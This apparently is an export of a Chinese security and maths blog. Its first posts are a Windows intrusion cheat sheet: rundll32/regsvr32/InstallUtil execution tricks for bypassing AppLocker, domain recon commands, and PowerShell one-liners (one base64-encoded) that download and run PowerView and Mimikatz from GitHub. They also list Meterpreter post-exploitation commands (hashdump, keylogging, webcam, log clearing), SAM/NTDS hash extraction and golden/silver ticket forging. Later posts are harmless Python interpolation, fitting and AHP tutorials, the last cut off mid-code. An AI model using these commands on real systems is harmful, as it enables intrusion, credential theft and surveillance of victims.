C:\WINDOWS\INF\SHELL.INF 当然有成型的工具可以帮助我们构建poc,这里比较大众的思路是使用msfvenom这类工具来自动化的生成poc.dll1234567msfvenom -p &lt;payload&gt; &lt;payload options&gt; -a &lt;arch&gt; --platform &lt;platform&gt; -e &lt;encoder option&gt; -i &lt;encoder times&gt; -b &lt;bad-chars&gt; -n &lt;nopsled&gt; -f &lt;format&gt; -o &lt;path&gt;# 其中payload可以通过以下命令查看，同理（payloads, encoders, nops, platforms, archs, formats, all）msfvenom -l payloads# 查询某个payload参数，以windows tcp为例msfvenom -p windows/meterpreter/reverse_tcp --payload-options 当然我们也可以利用Rundll32来执行javascript 细节参考：https://blog.csdn.net/caizi001/article/details/52853870 123rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;[js payload]#例子：rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;alert(&apos;foo&apos;); 当然除了使用rundll32以命令行的方式执行dll外还可以将dll重命名cpl，双击运行。 还有一些博客提到的利用rundll32打开自定义的cmd和注册表项的骚思路，这里在ws2012上测试没通过就没有细说，有兴趣可以参考：http://www.4hou.com/technology/5737.html 0x04 Regsvr32Regsvr32命令用于注册动态链接库文件，是 Windows 系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行 细节参考：https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32 1234567891011121314151617181920# 软件使用参数：regsvr32 [/u] [/s] [/n] [/i[:cmdline]] &lt;DllName&gt;/u卸载已安装的控件或DLL文件/s静默，不显示任何消息框/n指定不调用 DllRegisterServer，此选项必须与 /i 共同使用/i:cmdline调用 DllInstall 将它传递到可选的 [cmdline]，在与 /u 共同使用时，它调用 dll 卸载dllname指定要注册的 dll 文件名# 常用的利用方式包括--- 1.local COM scriptlet execution--- 2.remote COM scriptlet execution# 例子--- 1.regsvr32 /u /n /s /i:padload.sct scrobj.dll--- 2.regsvr32 /u /n /s /i:http://ip:port/payload.sct scrobj.dll--- 参考：https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1117/T1117.md 一个在windows10关闭杀软的条件下运行计算器的payload。测试在MS server 2012 无法顺利执行（SCT文件的构造原理和细节推荐阅读参考文献[8]）regsvr32 /i https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct 通过三好学生前辈的细致入微的解读，我们可以知道，通过在卸载控件时候加入Exec函数的功能调用可以直接在卸载时运行任意代码（calc.sct中Exec函数里面的payload），同时卸载控件的操作不需要管理员权限，也不需要写入注册表,所以可以成为绕过AppLocker的不二手段。 InstallUtil 工具细节移步：https://docs.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool 常用的两个步骤：编译cs,执行exe Installutil.exe所在路径没有被系统添加PATH环境变量中,因此需要按照如下命令执行方式使用绝对路径运行。12C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:PELoader.exe PELoader.csC:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U PELoader.exe 参考文献：[1]https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/critical-office-zero-day-attacks-detected-wild/?spm=a2c4e.11153940.blogcont205944.10.47ab657fMZ7L6E[2]https://paper.seebug.org/265/[3]https://zhuanlan.zhihu.com/p/48968904[4]http://drops.xmd5.com/static/drops/tips-11804.html[5]https://yq.aliyun.com/articles/205944[6]https://cloud.tencent.com/developer/article/1044559[7]https://docs.microsoft.com/en-us/previous-versions//ms536473(v=vs.85)[8]http://drops.xmd5.com/static/drops/tips-15124.html]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[域渗透（一）]]></title>
    <url>%2F2019%2F01%2F25%2F%E5%9F%9F%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[耽搁了一些时间的域渗透相关的学习总结，虽说之前零散的看了一些资料，但没有进行相关的汇总和总结。备考完期末考试后需要静下心来把这些零散的知识点进行复盘，之前的WS 2012环境忘记密码了，所以重新搭建了一个模拟的单树域环境进行相关概念的映证以及工具的使用。 DOS搜集123456789101112131415161718192021222324252627282930313233343536systeminfo # 查询系统信息systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; # 查询操作系统名称及版本（英文）systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot; # 查询操作系统名称及版本（中文）echo %PROCESSOR_ARCHITECTURE% # 查询系统体系结构SET # 查询所有环境变量whoami # 查询当前用户信息ipconfig /all # 查询本机IP、网关、DNS、IP段、所在域相关信息netstat -an # 查询所有和本地计算机建立连接的IPnet start # 查询已启动服务net time /domain # 查询域时间，以及域服务器的名字（快速查找域的方法）net user # 查询本机用户列表net user xxx # 查询指定用户信息net user /domain # 查询域用户net user /domain xxx 12345678 # 修改域用户密码（需要域管理员权限）net user domain-admin /domain # 查询域管理员登录时间，密码过期时间，是否有登录脚本，组分配等信息net localgroup administrator # 查询本机管理员（通常含有域用户）net localgroup administrator /domain # 查询登录本机的域管理员net localgroup administrator domain_name\pyxyuyu /add # 域用户（Users组）添加到本机Administrator组（需要本机管理员或域管理员在本机登录域后才能进行）net view # 查询同一域（工作组）内机器列表，列出的机器不一定在同一个网段，但是在网络结构中有联系net view /domain # 查询域（工作组）列表（可以查看计算机是否在某个域或工作组内）net view /domain:domain_name # 查询指定域内计算机列表net group # 查看域的组net group /domain # 查看所在域的工作组net group &quot;domain admins&quot; /domain # 查询域管理员用户组net group &quot;domain users&quot; /domain # 查询域成员用户组net group &quot;Domain controllers&quot; # 查询域控制器（如果有多台的话）ping 机器名 # 查询该计算机对应的IP，可以通过不同的机器来分析有哪些网段，了解本机在网络结构中所占角色ping 域 # 查询域服务器的IProute print # 查询路由表信息arp -A # 查询ARP缓存信息netsh firewall show config # 查询防火墙配置netsh firewall show state # 查询防火墙状态schtasks /QUERY /fo LIST /v # 查询计划任务（英文，中文系统的话，得先执行 chcp 437）tasklist /SVC # 查询服务进程IDDRIVERQUERY # 查询安装驱动wmic product list brief # 查询安装程序和版本信息（漏洞利用线索） dsquery 查询dsquery 时DS 上系统自带的查询命令1234567891011dsquery computer 查找目录中的计算机。dsquery contact 查找目录中的联系人。dsquery subnet 查找目录中的子网。dsquery group 查找目录中的组。dsquery ou 查找目录中的组织单位。dsquery site 查找目录中的站点。dsquery server 查找目录中的 AD DC/LDS 实例。dsquery user 查找目录中的用户。dsquery quota 查找目录中的配额规定。dsquery partition 查找目录中的分区。dsquery * 用通用的LDAP查询来查找目录中的任何对象。 运用powerview123456789101112131415Powershell.exe -Nop -NonI -Exec Bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview.ps1&apos;);Get-HostIP&quot;# 参数详解--[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 开启ssl，避免https报错-Command 需要执行的代码-ExecutionPolicy 设置默认的执行策略，一般使用Bypass-EncodedCommand 执行Base64代码-File 这是需要执行的脚本名-NoExit 执行完成命令之后不会立即退出，比如我们执行powerhsell whoami，执行完成之后会推出我们的PS会话，如果我们加上这个参数，运行完之后还是会继续停留在PS的界面-NoLogo 不输出PS的Banner信息-Noninteractive 不开启交互式的会话-NoProfile 不使用当前用户使用的配置文件-Sta 以单线程模式启动ps-Version 设置用什么版本去执行代码-WindowStyle 设置Powershell的执行窗口，有下面的参数Normal, Minimized, Maximized, or Hidden 12345678910111213141516171819202122232425Get-NetDomain - 获取当前用户所在域Get-NetForest - 获取和当前用户域相关的域森林Get-NetForestDomains - 获取所有的域森Get-NetDomainControllers - 在当前用户域中获取域控Get-NetCurrentUser - 获取当前用户名Get-NetUser - 返回所有用户或者指定用户Get-NetUserSPNs - 获取所有用户的服务资本Get-NetOUs - 获取域组织单元的数据Get-NetGUIDOUs - 查找链接到特定GUID的域组织单元Invoke-NetUserAdd - 增加一个域用户Get-NetGroups - 获取当前用户组列表Get-NetGroup - 在一个特殊的用户组中获取每个用户的数据Get-NetLocalGroups - 获取远程主机上的本地用户组Get-NetLocalGroup - 获取远程主机上的本地组的成员Get-NetLocalServices - 获取远程主机上正在运行的服务/路径的列表Invoke-NetGroupUserAdd - 将用户添加到指定的本地或域组Get-NetComputers - 获取域中所有当前服务器的列表Get-NetFileServers - 获取当前域用户使用的文件服务器列表Get-NetShare - 获取指定服务器的共享信息Get-NetLoggedon - 使用户主动登录到指定的服务器Get-NetSessions - 获取指定服务器上的活动会话Get-NetFileSessions - 组合Get-NetSessions和Get-NetFiles命令的返回结果Get-NetConnections - 获取连接到特定服务器资源的活动连接(共享)Get-NetFiles - 获取服务器上打开的文件Get-NetProcesses - 获取远程服务器上的远程进程和所有者 Meterpreter1234567891011121314151617181920212223242526272829303132333435363738394041424344meterpreter&gt;background #把会话挂到后台meterpreter&gt;clearev #清除日志meterpreter&gt;localtime #查看靶机的时间meterpreter&gt;hashdump #获取目标系统Hash值meterpreter&gt;migrate PID #进程迁移meterpreter&gt;webcam_list #查看目标是否有摄像头meterpreter&gt;webcam_snap #连接摄像头拍摄照片meterpreter&gt;webcam_stream #用摄像头录像meterpreter&gt;router #查看路由meterpreter&gt;screenshot #截取目标屏幕meterpreter&gt;getuid #查看当前用户meterpreter&gt;getsystem #提升至system权限meterpreter&gt;getprivs #查看当前权限meterpreter&gt;sysinfo #查看目标系统信息meterpreter&gt;keyscan_start #开始键盘记录meterpreter&gt;keyscan_dump #获取键盘记录内容meterpreter&gt;record_mic #录音meterpreter&gt;run post/windows/manage/enable_rdp #开启3389端口meterpreter&gt;run getgui -u 用户名 -p 密码 添加账户meterpreter&gt;run getgui -e #链接远程桌面窗口meterpreter&gt;sessions -i index #与会话进行交互，index表示第一个session meterpreter&gt;cat #查看文件内容meterpreter&gt;getwd #查看当前工作目录meterpreter&gt;upload #上传文件到目标机上meterpreter&gt;download #下载文件到本机上meterpreter&gt;c:\\1.txt #编辑或创建文件 没有的话，会新建文件meterpreter&gt;search -f *pass* # 搜索文件 -h查看帮助meterpreter&gt;rm C:\\test\\bytes.txt #删除文件meterpreter&gt;portfwd add -l 4444 -p 3389 -r 192.168.1.102 # 端口转发，本机监听4444，把目标机3389转到本机4444meterpreter&gt;execute -H -i -f cmd.exe #创建新进程cmd.exe，-H不可见，-i交互meterpreter&gt;kill pid #杀死进程meterpreter&gt;info #查看已有模块信息meterpreter&gt;idletime #查看目标机闲置时间meterpreter&gt;uictl disable mouse #禁用鼠标meterpreter&gt;uictl disable keyboard #禁用键盘meterpreter&gt;getproxy #查看代理信息meterpreter&gt;run autoroute -s 192.168.159.0/24 #添加到目标环境网络meterpreter&gt;run autoroute –p #查看添加的路由meterpreter&gt;run post/windows/gather/checkvm #是否windows虚拟机meterpreter&gt;run post/linux/gather/checkvm #是否linux虚拟机meterpreter&gt;run post/windows/gather/arp_scanner RHOSTS=192.168.159.0/24 端口扫描meterpreter&gt;run auxiliary/scanner/portscan/tcp RHOSTS=192.168.159.144 PORTS=3389 端口扫描meterpreter&gt;run post/windows/gather/enum_patches #补丁信息meterpreter&gt;execute -f 程序 #执行一个程序 密码hash文件1234567# 本机密码hashC:\windows\system32\config\SAMC:\Windows\System32\config\SYSTEM# 域环境密码hashC:\Windows\NTDSC:\Windows\SYSVOL 在windows xp，server2003之前包括xp&amp;2003的系统都可以通过工具抓取到完整的LM HASH&amp;NT HASH的。这样就可以直接通过在线的破译网站进行密码破解。 SAM密码文件extract 参考来源： https://computersecuritystudent.com/SECURITY_TOOLS/PASSWORD_CRACKING/lesson2/index.html 对SAM的破解需要用到两个文件(SYSTEM,SAM)和两个工具(bkhive,samdump2)12bkhive [SYSTEM] [syskey.txt]samdump2 [SAM] [syskey.txt]&gt;hashes.txt 但是，在最新的发布版本里面，samdump2已经把bkhive集成1samdump2 [OPTION]... SYSTEM_FILE SAM_FILE NTDS.DIT extract 下面几篇文章值得借阅http://www.nsoad.com/Article/system/20160915/400.htmlhttp://www.4hou.com/technology/12579.htmlhttps://blog.ropnop.com/extracting-hashes-and-domain-info-from-ntds-dit/https://www.freebuf.com/articles/system/177764.html 下面这个网址给出了如何将密码hash导出成为john或者hashcat格式：https://blog.didierstevens.com/2016/07/13/practice-ntds-dit-file-part-2-extracting-hashes/ 当然如果有比较好的字典，可以直接进行密码的爆破https://github.com/dafthack/DomainPasswordSpray mimikatz module~lsadump上述链接介绍了针对windows LM HASH&amp;NT HASH众工具集，下面主要以mimikatz module~lsadump为例，进行一些实验操作。 参考链接： https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump mimikatz无文件导hash以下攻击向量在windows server 2012 测试通过，然而windows10 测试不通过。 12345678Powershell.exe -Nop -NonI -Exec Bypass &quot;[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&apos;);Invoke-Mimikatz&quot;#加密版powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AUABvAHcAZQByAFMAaABlAGwAbABNAGEAZgBpAGEALwBQAG8AdwBlAHIAUwBwAGwAbwBpAHQALwBtAGEAcwB0AGUAcgAvAEUAeABmAGkAbAB0AHIAYQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAnACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA== windows server 2012 运行截图 Bypass UACUAC机制在 Vista版本引进，并在后续的版本，如 windows7 和windows server2012 windows10……上面均有沿用。 具体原理请移步https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works 这里搜录一个比较牛的一直在更新的github项目——UACME,找时间一定好好学习下这些思路https://github.com/hfiref0x/UACME 域环境票据伪造 这篇文章对windows的认证将得很透http://www.yilan.io/article/5c343fe549205a2c276e3381 既然知道了上述windows认证的协议细节，我们可以明白，获取特定服务主机的hash后我们可以构造白银票据；知道了kerberos用户的hash,我们就可以构造任何服务的黄金票据。构造的相关过程，上述链接里面也有了介绍。这里把关键的密令步骤摘录如下（具体的细节，请移步mimikatz官方wiki：https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos）： 白银票据1mimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLM Hash&gt; /user:&lt;用户名&gt; /ptt&quot; exit 黄金票据1mimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /rc4:&lt;KRBTGT NTLM Hash&gt; /user:&lt;任意用户名&gt; /ptt&quot; exit 上述命令执行完毕会直接在当前会话注入票据（相当于直接集成了kerberos::ptt命令）。当然最后的/ppt换成/ticket后接输出文件名可以把票据直接保存到文件，而不是直接注入当前会话。 如何找域控 查找内网DNS 扫描获取开放端口为389机器 使用NLTEST命令查看 运用net命令或者其他类似工具查找域控 以下命令可以带来帮助 1234567891011121.net viewnet view /domain2.set logset log3.通过srv记录nslookup -type=SRV _ldap._tcp.corp4.使用nltestnltest /dclist:corp5.使用dsqueryDsQuery Server -domain corp6.使用netdomnetdom query pdc 参考[1] PS Bypass UAC[2] 九种姿势运行Mimikatz[3] powershell 远程下载[4] msf 五种方式绕过UAC[5] Anatomy of UAC Attacks[6] Powershell提权框架[7] 内网剑客三结义[8] 从零开始内网渗透学习[9] 我所了解的内网渗透——内网渗透知识大总结[10] 域渗透基础简单信息收集[11] 域渗透的整理[12] 我所了解的内网渗透——内网渗透知识大总结]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数模之插值与拟合]]></title>
    <url>%2F2018%2F12%2F28%2F%E6%95%B0%E6%A8%A1%E4%B9%8B%E6%8F%92%E5%80%BC%E4%B8%8E%E6%8B%9F%E5%90%88%2F</url>
    <content type="text"><![CDATA[插值与拟合是一种通过数据点总结出一般性规律的过程，线性回归就是拟合思想的一个最直观的体现。但是插值和拟合二者是不一样的。所谓的插值是找出一条经过所有点的曲线，然后得出曲线方程。而拟合不要求曲线经过所有的点，而是通过最小二乘法这样的方式找到所有点到直线的最短距离，来大致的拟合数据。二者的侧重点稍有不一样。这篇文章是对python编程实现插值和拟合的一个小结。 在python这块做插值和拟合大致有以下一些可以使用的第三方库，包括插值，多元，多项式拟合等各种领域。 numpy 自带的线性拟合,使用最小二乘法实现的可以针对多项式拟合 scipy.optimize 模块自定义函数拟合 sklearn 实现单变量和多元拟合 scipy.interpolate实现多维插值 statsmodels实现单变量与多元拟合 numpy 实现自定义多项式拟合12345678import numpy as npX=[ 1 ,2 ,3 ,4 ,5 ,6]Y=[ 2.5 ,3.51 ,4.45 ,5.52 ,6.47 ,7.51]z1 = np.polyfit(X, Y, 1) #一次多项式拟合，相当于线性拟合p1 = np.poly1d(z1)print (z1) #[ 1. 1.49333333]print (p1) # 1 x + 1.493 [1. 1.49333333] 1 x + 1.493 1234567891011121314151617181920212223242526import numpyfrom matplotlib import pyplot as pltdef polyfit(x, y, degree): results = &#123;&#125; coeffs = numpy.polyfit(x, y, degree)#多项式拟合，degree表示项数 print(coeffs) results['polynomial'] = coeffs.tolist() # r-squared p = numpy.poly1d(coeffs) #将结果转换成函数 # fit values, and mean yhat = p(x) # or [p(z) for z in x] ybar = numpy.sum(y)/len(y) # or sum(y)/len(y) ssreg = numpy.sum((yhat-ybar)**2) # or sum([ (yihat - ybar)**2 for yihat in yhat]) sstot = numpy.sum((y - ybar)**2) # or sum([ (yi - ybar)**2 for yi in y]) results['determination'] = ssreg / sstot #准确率 print(results) plt.plot(x,p(x),'r',label='fit') plt.scatter(x,y) plt.show()x=[ 1 ,2 ,3 ,4 ,5 ,6]y=[ 2.5 ,3.51 ,4.45 ,5.52 ,6.47 ,7.2]z1 = polyfit(x, y, 2) [-0.02428571 1.12571429 1.37 ] {&#39;polynomial&#39;: [-0.024285714285714497, 1.1257142857142874, 1.3699999999999957], &#39;determination&#39;: 0.9989301416685602} scipy.optimize 模块自定义函数拟合12345678910111213141516171819202122232425import numpy as npfrom matplotlib import pyplot as pltfrom scipy.optimize import curve_fit def f(x): return 2*np.sin(x)+3def f_fit(x,a,b): return a*np.sin(x)+bdef f_show(x,p_fit): a,b=p_fit.tolist() return a*np.sin(x)+bx=np.linspace(-2*np.pi,2*np.pi)y=f(x)+0.5*np.random.randn(len(x))#加入了噪音p_fit,pcov=curve_fit(f_fit,x,y)#曲线拟合print(p_fit)#最优参数print(pcov)#最优参数的协方差估计矩阵y1=f_show(x,p_fit)plt.plot(x,f(x),'r',label='original')plt.scatter(x,y,c='g',label='before_fitting')#散点图plt.plot(x,y1,'b--',label='fitting')plt.xlabel('x')plt.ylabel('y')plt.legend()plt.show() [2.0287684 2.99863621] [[1.04777038e-02 7.43259080e-12] [7.43259080e-12 5.13407483e-03]] 123456789101112131415161718192021222324252627282930313233343536373839import numpy as npfrom scipy.optimize import leastsq # 从scipy库的optimize模块引入leastsq函数import pylab as pl # 引入绘图模块pylab，并重命名为pldef func(x, p): """ 数据拟合所用的函数: A*sin(2*pi*k*x + theta) """ A, k, theta = p return A*np.sin(2*np.pi*k*x+theta) def residuals(p, y, x): """ 实验数据x, y和拟合函数之间的差，p为拟合需要找到的系数 """ return y - func(x, p) x = np.linspace(0, -2*np.pi, 100)A, k, theta = 10, 0.34, np.pi/6 # 真实数据的函数参数y0 = func(x, [A, k, theta]) # 真实数据y1 = y0 + 2 * np.random.randn(len(x)) # 加入噪声之后的实验数据，噪声是服从标准正态分布的随机量 p0 = [7, 0.2, 0] # 第一次猜测的函数拟合参数# 调用leastsq进行数据拟合# residuals为计算误差的函数# p0为拟合参数的初始值# args为需要拟合的实验数据plsq = leastsq(residuals, p0, args=(y1, x))print ("actual parameter:", [A, k, theta]) # 真实参数print ("fitting parameter", plsq[0]) # 实验数据拟合后的参数pl.plot(x, y0, label="actual data") # 绘制真实数据pl.plot(x, y1, label="experimental data with noise") # 带噪声的实验数据pl.plot(x, func(x, plsq[0]), label="fitting data") # 拟合数据pl.legend()pl.show() actual parameter: [10, 0.34, 0.5235987755982988] fitting parameter [10.09077955 0.3434116 -5.6891585 ] scipy.interpolate实现多维插值一维123456789101112131415161718192021import numpy as npfrom scipy import interpolateimport pylab as plx=np.linspace(0,10,11)#x=[ 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10.]y=np.sin(x)xnew=np.linspace(0,10,101)pl.plot(x,y,"ro")for kind in ["nearest","zero","slinear","quadratic","cubic"]:#插值方式 #"nearest","zero"为阶梯插值 #slinear 线性插值 #"quadratic","cubic" 为2阶、3阶B样条曲线插值 f=interpolate.interp1d(x,y,kind=kind) # ‘slinear’, ‘quadratic’ and ‘cubic’ refer to a spline interpolation of first, second or third order) ynew=f(xnew) pl.plot(xnew,ynew,label=str(kind))pl.legend(loc="lower right")pl.show() 二维12345678910111213141516171819202122232425262728293031323334import numpy as npfrom scipy import interpolateimport pylab as plimport matplotlib as mpldef func(x, y): return (x+y)*np.exp(-5.0*(x**2 + y**2))# X-Y轴分为15*15的网格y,x= np.mgrid[-1:1:15j, -1:1:15j]fvals = func(x,y) # 计算每个网格点上的函数值 15*15的值print (len(fvals[0]))#三次样条二维插值newfunc = interpolate.interp2d(x, y, fvals, kind='cubic')# 计算100*100的网格上的插值xnew = np.linspace(-1,1,100)#xynew = np.linspace(-1,1,100)#yfnew = newfunc(xnew, ynew)#仅仅是y值 100*100的值# 绘图# 为了更明显地比较插值前后的区别，使用关键字参数interpolation='nearest'# 关闭imshow()内置的插值运算。pl.subplot(121)im1=pl.imshow(fvals, extent=[-1,1,-1,1], cmap=mpl.cm.hot, interpolation='nearest', origin="lower")#pl.cm.jet#extent=[-1,1,-1,1]为x,y范围 favals为pl.colorbar(im1)pl.subplot(122)im2=pl.imshow(fnew, extent=[-1,1,-1,1], cmap=mpl.cm.hot, interpolation='nearest', origin="lower")pl.colorbar(im2)pl.show() 15 12345678910111213141516171819202122from mpl_toolkits.mplot3d import Axes3Dimport numpy as npimport matplotlib.pyplot as pltfrom scipy import interpolatefig = plt.figure()ax = fig.gca(projection='3d')ax2=fig.gca(projection='3d')# Prepare arrays x, y, zx = np.arange(-5.01, 5.01, 0.25)y = np.arange(-5.01, 5.01, 0.25)xx, yy = np.meshgrid(x, y)z = np.sin(xx**2+yy**2)f = interpolate.interp2d(x, y, z, kind='cubic')xnew = np.arange(-5.01, 5.01, 1e-2)ynew = np.arange(-5.01, 5.01, 1e-2)znew = f(xnew, ynew)ax.plot(x, y,z[0, :], 'ro-')plt.show() 12345678910import matplotlib.pyplot as pltfrom scipy.interpolate import splev, splrepx = np.linspace(0, 10, 10)y = np.sin(x)spl = splrep(x, y)print(spl)x2 = np.linspace(0, 10, 200)y2 = splev(x2, spl)plt.plot(x, y, 'o', x2, y2)plt.show() (array([ 0. , 0. , 0. , 0. , 2.22222222, 3.33333333, 4.44444444, 5.55555556, 6.66666667, 7.77777778, 10. , 10. , 10. , 10. ]), array([-4.94881722e-18, 8.96543619e-01, 1.39407154e+00, -2.36640266e-01, -1.18324030e+00, -8.16301228e-01, 4.57836125e-01, 1.48720677e+00, 1.64338775e-01, -5.44021111e-01, 0.00000000e+00, 0.00000000e+00, 0.00000000e+00, 0.00000000e+00]), 3) sklearn 实现拟合sklearn 统一化的api可以实现单变量多变量的拟合。下面给出单变量多项式拟合例子，多元拟合可以参看参考文献[5] 12345678910111213141516171819202122232425262728293031323334353637383940import matplotlib.pyplot as pltimport numpy as npfrom sklearn.linear_model import LinearRegressionfrom sklearn.preprocessing import PolynomialFeaturesplt.figure() # 实例化作图变量plt.title('single variable') # 图像标题plt.xlabel('x') # x轴文本plt.ylabel('y') # y轴文本plt.axis([30, 400, 100, 400])plt.grid(True) # 是否绘制网格线X = [[50],[100],[150],[200],[250],[300]]y = [[150],[200],[250],[280],[310],[330]]X_test = [[250],[300]] # 用来做最终效果测试y_test = [[310],[330]] # 用来做最终效果测试plt.plot(X, y, 'o')model = LinearRegression()model.fit(X, y)X2 = [[30], [400]]y2 = model.predict(X2)plt.plot(X2, y2, 'g-')xx = np.linspace(30, 400, 100) # 设计x轴一系列点作为画图的x点集quadratic_featurizer = PolynomialFeatures(degree=2) # 实例化一个二次多项式特征实例X_train_quadratic = quadratic_featurizer.fit_transform(X) # 用二次多项式对样本X值做变换xx_quadratic = quadratic_featurizer.transform(xx.reshape(xx.shape[0], 1)) # 把训练好X值的多项式特征实例应用到一系列点上,形成矩阵regressor_quadratic = LinearRegression() # 创建一个线性回归实例regressor_quadratic.fit(X_train_quadratic, y) # 以多项式变换后的x值为输入，代入线性回归模型做训练plt.plot(xx, regressor_quadratic.predict(xx_quadratic), 'r') # 用训练好的模型作图print("截距：",regressor_quadratic.intercept_)print("二次多项式参数：",regressor_quadratic.coef_)# 模型评价：print ('一元线性回归 r-squared', model.score(X_test, y_test))X_test_quadratic = quadratic_featurizer.transform(X_test)print ('二次回归 r-squared', regressor_quadratic.score(X_test_quadratic, y_test))# 展示图像plt.show() 截距： [89.] 二次多项式参数： [[ 0. 1.295 -0.00164286]] 一元线性回归 r-squared 0.07555555555555149 二次回归 r-squared 0.9993367346938364 多元回归statsmodels和sklearn一样其实都是可以实现多元回归的，不过不得不说statsmodels在输出这块上的逼格很高，看起来很专业。所以比较推荐使用statsmodels实现多元回归的参数拟合。 123456789101112131415import numpy as npimport statsmodels.api as sm# 数据生成nobs = 100X = np.random.random((nobs, 3))# sm 计算的时候需要提供一个截距，所以这一步是必须的X = sm.add_constant(X)beta = [1, .1, .5,.5]e = np.random.random(nobs)y = np.dot(X, beta) + e# 调用OLS拟合算法，其他的算法可以参看参考文献[2]，statsmodels提供了四种高效的拟合算法。results = sm.OLS(y, X).fit()# statsmodels 的输出十分专业，除了拟合的参数外，还有一些评价指标，如F，AIC，R-squared等print(results.summary()) OLS Regression Results ============================================================================== Dep. Variable: y R-squared: 0.361 Model: OLS Adj. R-squared: 0.341 Method: Least Squares F-statistic: 18.09 Date: Fri, 28 Dec 2018 Prob (F-statistic): 2.20e-09 Time: 11:38:53 Log-Likelihood: -13.182 No. Observations: 100 AIC: 34.36 Df Residuals: 96 BIC: 44.78 Df Model: 3 Covariance Type: nonrobust ============================================================================== coef std err t P&gt;|t| [0.025 0.975] ------------------------------------------------------------------------------ const 1.4756 0.086 17.181 0.000 1.305 1.646 x1 0.1855 0.095 1.948 0.054 -0.004 0.374 x2 0.3950 0.101 3.900 0.000 0.194 0.596 x3 0.5127 0.100 5.116 0.000 0.314 0.712 ============================================================================== Omnibus: 21.977 Durbin-Watson: 1.866 Prob(Omnibus): 0.000 Jarque-Bera (JB): 5.354 Skew: 0.133 Prob(JB): 0.0688 Kurtosis: 1.898 Cond. No. 5.97 ============================================================================== Warnings: [1] Standard Errors assume that the covariance matrix of the errors is correctly specified. 参考[1] https://docs.scipy.org/doc/scipy/reference/interpolate.html[2] http://www.statsmodels.org/stable/regression.html[3] https://zhuanlan.zhihu.com/p/28149195[4] https://docs.scipy.org/doc/numpy-1.15.0/reference/generated/numpy.polyfit.html[5] https://ask.hellobi.com/blog/okajun/12252[6] https://cloud.tencent.com/developer/article/1064376]]></content>
  </entry>
  <entry>
    <title><![CDATA[数模之层次分析]]></title>
    <url>%2F2018%2F12%2F26%2F%E6%95%B0%E6%A8%A1%E4%B9%8B%E5%B1%82%E6%AC%A1%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[层次分析模型是一种将经验判断和数学分析结合的建模方式，用来解决一些比较抽象的无法定量分析的问题。其核心是构造一致性判断矩阵。整个算法流程其实不是特别难理解，只不过其中涉及到了一些线性代数的知识，让我恶补了一下线代。下面对层次分析算法进行一个学习记录。 概述既然提到层次分析，那自然得放一张图，让我们了解一下怎么个分层法。 这里以《数学建模算法与程序》这本书的原图为例 其实不难理解，我们把整个分析流程分为目标层，方案层，准则层。也就是将一些判断因素作为准测放在了准测层里面。通过准则层的一致性判断矩阵的权重来指导我们最后的目标层的选择。网上已经有很多对这一建模方案的教程（参考文献已经给出的了一些笔者认为解释得比较不错的链接），这里仅仅列出我们的算法步骤和一个笔者在网上搜罗的比较贴近原理的参考代码（参考文献【1】），但是它少了层次总排序校验部分，笔者做了修改，现把代码给出如下： 层次分析法的算法流程和步骤： 建立层次结构模型； 构造判断(成对比较)矩阵； 层次单排序及其一致性检验； 层次总排序及其一致性检验 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172import numpy as npRI_dict = &#123;1: 0, 2: 0, 3: 0.58, 4: 0.90, 5: 1.12, 6: 1.24, 7: 1.32, 8: 1.41, 9: 1.45, 10: 1.49, 11: 1.51&#125;CI_list=[]def get_w(array): row = array.shape[0] # 计算出阶数 a_axis_0_sum = array.sum(axis=0) # print(a_axis_0_sum) b = array / a_axis_0_sum # 新的矩阵b # print(b) b_axis_0_sum = b.sum(axis=0) b_axis_1_sum = 